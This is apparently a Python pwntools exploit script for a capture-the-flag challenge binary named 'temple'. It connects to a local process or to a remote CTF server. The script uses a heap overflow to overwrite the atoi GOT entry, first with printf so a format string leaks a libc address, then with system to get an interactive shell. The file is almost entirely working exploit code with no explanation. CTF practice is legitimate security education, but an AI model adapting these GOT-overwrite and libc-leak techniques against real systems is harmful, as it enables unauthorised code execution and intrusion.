from pwn import *

#context.log_level = "debug"
def take_wisdom(index):
    conn.sendlineafter("Your choice: ", "1")
    conn.sendlineafter("What wisdom do you seek?: ", str(index))

def give_wisdom(size, content):
    conn.sendlineafter("Your choice: ", "2")
    conn.sendlineafter("How much wisdom do you hold?: ", str(size))
    conn.sendafter("What is your wisdom?: ", content)

def rethink_wisdom(index, content):
    conn.sendlineafter("Your choice: ", "3")
    conn.sendlineafter("What wisdom do you wish to rethink?: ", str(index))
    conn.sendafter("How do you see this differently?: ", content)

def exploit():
    give_wisdom(0x20, "\n")
    take_wisdom(1)
    take_wisdom(8)
    give_wisdom(0x20, "\n")
    take_wisdom(9)
    MM_HEAP = u64(conn.recv(0x10)[0x8:0x10]) - 0x1c0
    log.success("MM_HEAP :0x%x" % MM_HEAP)
    give_wisdom(0x100, "A" * 8 + p64(0x100) + "A" * 0xf0)
    give_wisdom(0x10, "A" * 0x10)
    take_wisdom(11)
    give_wisdom(0xe60, "A" * 0xe60)
    #0x603098 --> 0x7f6ac1b16e80 (<atoi>:
    rethink_wisdom(12, "B" * 0x100 + p64(0x8) + p64(0x603098) + "\n")
    #0x400900 (<printf@plt>:
    rethink_wisdom(12, p64(0x400900))
    conn.sendlineafter("Your choice: ", "%55$p")
    #0000000000021a50 T __libc_start_main
    #+0xf5
    LIBC = int(conn.recvline()[:-1], 16) - (0x21a50 + 0xf5)
    log.success("LIBC :0x%x" % LIBC)
    conn.sendlineafter("Your choice: ", "A" * (3 - 1))
    conn.sendlineafter("What wisdom do you wish to rethink?: ", "A" * (12 - 1))
    #0000000000041490 W system
    conn.sendafter("How do you see this differently?: ", p64(LIBC + 0x41490))
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "temple.tuctf.com"
        PORT = 4343
        conn = remote(HOST, PORT)
    else:
        conn = process("./temple")
    exploit()
